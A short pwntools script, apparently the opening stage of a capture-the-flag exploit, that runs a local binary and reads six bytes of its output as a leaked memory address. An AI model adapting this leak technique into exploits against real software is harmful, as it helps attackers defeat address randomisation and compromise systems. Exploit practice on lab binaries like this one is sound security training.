
from pwn import *

p = process("./1.bin")

p.readuntil(b"Hello ")

leak = u64( p.read(6) + b"\x00\x00" )

print("Leaked address: {:16x}".format(leak))
